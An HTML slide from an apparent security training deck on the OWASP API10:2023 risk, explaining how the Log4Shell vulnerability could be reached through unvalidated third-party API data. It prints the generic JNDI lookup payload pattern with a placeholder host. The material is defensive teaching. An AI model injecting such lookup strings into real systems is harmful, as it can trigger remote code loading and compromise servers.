@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>API10:2023 &#x2014; Unsafe Consumption of APIs &#xb7; Slide 13 of 28</title>
+<link rel="stylesheet" href="api10-shared.css">
+</head>
+<body>
+<div class="top-nav">
+  <div class="nav-left"><span class="nav-badge">API10:2023</span><span class="nav-title">Unsafe Consumption of APIs</span></div>
+  <span class="nav-right">Slide 13 of 28</span>
+</div>
+<div class="progress-wrap">
+  <div class="tab-nav"><a class="seg done" href="api10-slide-01.html"></a><a class="seg done" href="api10-slide-02.html"></a><a class="seg done" href="api10-slide-03.html"></a><a class="seg done" href="api10-slide-04.html"></a><a class="seg done" href="api10-slide-05.html"></a><a class="seg done" href="api10-slide-06.html"></a><a class="seg done" href="api10-slide-07.html"></a><a class="seg done" href="api10-slide-08.html"></a><a class="seg done" href="api10-slide-09.html"></a><a class="seg done" href="api10-slide-10.html"></a><a class="seg done" href="api10-slide-11.html"></a><a class="seg done" href="api10-slide-12.html"></a><a class="seg active" href="api10-slide-13.html"></a><a class="seg" href="api10-slide-14.html"></a><a class="seg" href="api10-slide-15.html"></a><a class="seg" href="api10-slide-16.html"></a><a class="seg" href="api10-slide-17.html"></a><a class="seg" href="api10-slide-18.html"></a><a class="seg" href="api10-slide-19.html"></a><a class="seg" href="api10-slide-20.html"></a><a class="seg" href="api10-slide-21.html"></a><a class="seg" href="api10-slide-22.html"></a><a class="seg" href="api10-slide-23.html"></a><a class="seg" href="api10-slide-24.html"></a><a class="seg" href="api10-slide-25.html"></a><a class="seg" href="api10-slide-26.html"></a><a class="seg" href="api10-slide-27.html"></a><a class="seg" href="api10-slide-28.html"></a></div>
+  <div class="progress-labels"><span>Part 2 &#xb7; How It Works</span><span>Slide 13</span></div>
+</div>
+<div class="slide active">
+
+  <div class="slide-eyebrow">Slide 13 &#xb7; Real Incident</div>
+  <div class="slide-title">Log4Shell (CVE-2021-44228) &#x2014; RCE via third-party API data that reached the logger.</div>
+  <div class="slide-subtitle">December 2021. A JNDI lookup string entered through an API integration path &#x2014; not a user form &#x2014; triggered remote code execution.</div>
+  <div class="source-tag">&#x1F4C4; CVE-2021-44228 &#xb7; Apache Software Foundation &#xb7; CISA &#xb7; December 2021</div>
+  <div class="scenario-card">
+    <div class="scenario-num">THE VULNERABILITY</div>
+    <div class="scenario-title">Apache Log4j 2 &#x2014; JNDI Lookup Evaluation in Log Messages</div>
+    <div class="scenario-body">
+      <p>Apache Log4j 2, the most widely used Java logging library, included a feature called JNDI lookup. When a log message contained the pattern <code>${jndi:ldap://host/path}</code>, Log4j would initiate an outbound LDAP request to the specified host and potentially load and execute a Java class returned by the server. This was a &#x201C;feature&#x201D; designed for configuration lookups &#x2014; but it evaluated any string in any log message.</p>
+      <p>The implication: any value that reached a Log4j log statement and contained <code>${jndi:...}</code> would trigger an outbound connection &#x2014; and potentially remote code execution. The source of the value did not matter: user input, HTTP headers, database values, or third-party API responses.</p>
+    </div>
+    <div class="scenario-why"><strong>The API10 path:</strong> Many APIs consumed third-party data that was later logged. Geolocation APIs returned city and country names &#x2014; logged for analytics. User-agent normalization services returned structured device data &#x2014; logged for debugging. E-commerce enrichment APIs returned product metadata &#x2014; logged for inventory tracking. An attacker who could influence what a third-party API returned &#x2014; or who compromised any of these third-party services &#x2014; could deliver a Log4Shell payload through the trusted data path. The consuming API never validated the third-party data before logging it. The JNDI string was treated as ordinary data from a trusted source. CVE-2021-44228 was rated CVSS 10.0 (maximum). CISA ordered all U.S. federal agencies to patch within one week. Millions of servers worldwide were vulnerable, and mass exploitation began within 24 hours of public disclosure on December 9, 2021.</div>
+  </div>
+  <div class="callout orange">
+    <div class="callout-label">The API10 lesson from Log4Shell</div>
+    <p>Log4Shell was primarily exploited through direct user-controlled input (HTTP headers, request parameters). But the API10 variant &#x2014; delivery through third-party API responses &#x2014; was also a real attack path. Applications that validated and sanitized user input still logged third-party data without review. The assumption: &#x201C;this data came from our geolocation provider, it&#x2019;s just a city name.&#x201D; That assumption is the vulnerability.</p>
+  </div>
+  <div class="btn-row">
+    <a class="btn-secondary" href="api10-slide-12.html">&#x2190; Back</a>
+    <a class="btn-primary" href="api10-slide-14.html">Attack Scenarios &#x2192;</a>
+  </div>
+
+</div>
+<div class="page-footer"><a href="sources.html">&#x1F4C4; View sources</a></div>
+</body>
+</html>
